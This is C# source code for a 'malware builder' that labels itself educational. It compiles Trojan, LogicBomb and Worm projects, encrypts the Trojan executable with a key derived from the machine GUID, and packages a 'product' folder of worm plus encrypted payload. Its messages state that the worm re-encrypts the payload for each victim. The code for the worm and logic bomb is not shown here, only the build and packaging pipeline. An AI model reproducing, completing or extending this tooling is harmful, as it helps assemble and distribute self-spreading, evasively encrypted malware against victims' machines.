using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using SharedCrypto;

namespace Builder
{
    class Program
    {
        private static string SolutionDir;
        private static string BuilderOutputDir;
        private static string PayloadDir;

        private static string MachineGuid;

        static void Main(string[] args)
        {
            Console.WriteLine("===========================================");
            Console.WriteLine("   MALWARE BUILDER - EDUCATIONAL USE ONLY");
            Console.WriteLine("   Polymorphic Encryption Edition");
            Console.WriteLine("===========================================");
            Console.WriteLine();

            try
            {
                InitializePaths();
                GetMachineGuidAndDeriveKeys();

                BuildProject("SharedCrypto");
                BuildProject("Trojan");
                BuildProject("LogicBomb");
                BuildProject("Worm");

                EncryptTrojan();
                CreateOutputStructure();
                CleanupIntermediateFiles();

                Console.WriteLine();
                LogSuccess("Build completed successfully!");
                Console.WriteLine();
                LogInfo($"Output location: {BuilderOutputDir}");
                LogInfo("Structure:");
                LogInfo($"  product/");
                LogInfo($"    - Worm.exe");
                LogInfo($"    - SharedCrypto.dll");
                LogInfo($"    - SharedCrypto.pdb");
                LogInfo($"    - payload/");
                LogInfo($"        - LogicBomb.exe");
                LogInfo($"        - SharedCrypto.dll");
                LogInfo($"        - SharedCrypto.pdb");
                LogInfo($"        - bomb.encrypted");
                Console.WriteLine();
                LogWarning("Note: bomb.encrypted is encrypted with THIS machine's GUID.");
                LogWarning("Worm will re-encrypt for each victim with their specific GUID.");
            }
            catch (Exception ex)
            {
                Console.WriteLine();
                LogError("BUILD FAILED!");
                LogError($"Error: {ex.Message}");
                Console.WriteLine();
                LogError("Stack trace:");
                Console.WriteLine(ex.StackTrace);
                Environment.Exit(1);
            }

            Console.WriteLine();
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
        }

        private static void InitializePaths()
        {
            LogInfo("Initializing paths...");

            string currentDir = AppDomain.CurrentDomain.BaseDirectory;
            SolutionDir = Directory.GetParent(currentDir).Parent.Parent.Parent.FullName;

            BuilderOutputDir = Path.Combine(currentDir, "product");
            PayloadDir = Path.Combine(BuilderOutputDir, "payload");

            // Clean previous build
            if (Directory.Exists(BuilderOutputDir))
            {
                Directory.Delete(BuilderOutputDir, true);
            }

            Directory.CreateDirectory(BuilderOutputDir);
            Directory.CreateDirectory(PayloadDir);

            LogSuccess($"Solution directory: {SolutionDir}");
            LogSuccess($"Output directory: {BuilderOutputDir}");
            Console.WriteLine();
        }

        private static void GetMachineGuidAndDeriveKeys()
        {
            LogInfo("Retrieving Machine GUID for polymorphic encryption...");

            MachineGuid = CryptoUtils.GetMachineGuid();

            LogSuccess($"Machine GUID: {MachineGuid}");
            Console.WriteLine();

            LogInfo("Deriving encryption keys from Machine GUID...");
            CryptoUtils.LogDerivedKeys(MachineGuid);
            Console.WriteLine();
        }

        private static void BuildProject(string projectName)
        {
            LogInfo($"Building {projectName} project...");

            string projectPath = Path.Combine(SolutionDir, projectName, $"{projectName}.csproj");

            if (!File.Exists(projectPath))
            {
                throw new FileNotFoundException($"Project file not found: {projectPath}");
            }

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "dotnet",
                Arguments = $"build \"{projectPath}\" --configuration Debug",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(psi))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                if (process.ExitCode != 0)
                {
                    Console.WriteLine(output);
                    Console.WriteLine(error);
                    throw new Exception($"Failed to build {projectName}. Exit code: {process.ExitCode}");
                }
            }

            LogSuccess($"{projectName} built successfully");
            Console.WriteLine();
        }

        private static void EncryptTrojan()
        {
            LogInfo("Encrypting Trojan.exe with machine-specific key...");

            string trojanExePath = FindExecutable("Trojan", "Trojan.exe");

            LogInfo($"Found Trojan.exe at: {trojanExePath}");

            string encryptedOutputPath = Path.Combine(PayloadDir, "bomb.encrypted");

            CryptoUtils.EncryptFile(trojanExePath, encryptedOutputPath, MachineGuid);

            FileInfo originalFile = new FileInfo(trojanExePath);
            FileInfo encryptedFile = new FileInfo(encryptedOutputPath);

            LogSuccess($"Trojan.exe encrypted successfully");
            LogSuccess($"Original size: {originalFile.Length} bytes");
            LogSuccess($"Encrypted size: {encryptedFile.Length} bytes");
            LogSuccess($"Output: {encryptedOutputPath}");
            Console.WriteLine();
        }

        private static void CreateOutputStructure()
        {
            LogInfo("Creating output structure in 'product' folder...");

            // Copy Worm and its dependencies
            CopyFileToOutput("Worm", "Worm.exe", BuilderOutputDir);
            CopyFileToOutput("SharedCrypto", "SharedCrypto.dll", BuilderOutputDir);
            CopyFileToOutput("SharedCrypto", "SharedCrypto.pdb", BuilderOutputDir);

            // Copy LogicBomb and its dependencies
            CopyFileToOutput("LogicBomb", "LogicBomb.exe", PayloadDir);
            CopyFileToOutput("SharedCrypto", "SharedCrypto.dll", PayloadDir);
            CopyFileToOutput("SharedCrypto", "SharedCrypto.pdb", PayloadDir);

            LogSuccess("bomb.encrypted already in product/payload folder");

            Console.WriteLine();
        }

        private static void CopyFileToOutput(string projectName, string fileName, string destinationDir)
        {
            string sourcePath = FindExecutable(projectName, fileName);
            string destPath = Path.Combine(destinationDir, fileName);
            File.Copy(sourcePath, destPath, true);
            LogSuccess($"Copied {fileName} to {Path.GetFileName(destinationDir)}");
        }

        private static string FindExecutable(string projectName, string exeName)
        {
            string[] possiblePaths = new[]
            {
                Path.Combine(SolutionDir, projectName, "bin", "Debug", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net472", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net48", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "netstandard2.0", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "netstandard2.1", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net6.0", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net7.0", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net8.0", exeName)
            };

            foreach (string path in possiblePaths)
            {
                if (File.Exists(path))
                {
                    return path;
                }
            }

            throw new FileNotFoundException($"{exeName} not found in any expected location for project {projectName}");
        }

        private static void CleanupIntermediateFiles()
        {
            LogInfo("Cleaning up intermediate files...");

            try
            {
                string[] projectsToClean = { "Worm", "LogicBomb", "Trojan", "SharedCrypto" };

                foreach (string project in projectsToClean)
                {
                    string binPath = Path.Combine(SolutionDir, project, "bin");
                    if (Directory.Exists(binPath))
                    {
                        Directory.Delete(binPath, true);
                        LogSuccess($"Cleaned {project}/bin folder");
                    }

                    string objPath = Path.Combine(SolutionDir, project, "obj");
                    if (Directory.Exists(objPath))
                    {
                        Directory.Delete(objPath, true);
                        LogSuccess($"Cleaned {project}/obj folder");
                    }
                }

                Console.WriteLine();
            }
            catch (Exception ex)
            {
                LogWarning($"Cleanup warning: {ex.Message}");
                LogWarning("Some files may still be in use. This is non-critical.");
                Console.WriteLine();
            }
        }

        private static void LogInfo(string message)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("[INFO] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        private static void LogSuccess(string message)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[SUCCESS] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        private static void LogWarning(string message)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("[WARNING] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        private static void LogError(string message)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("[ERROR] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }
    }
}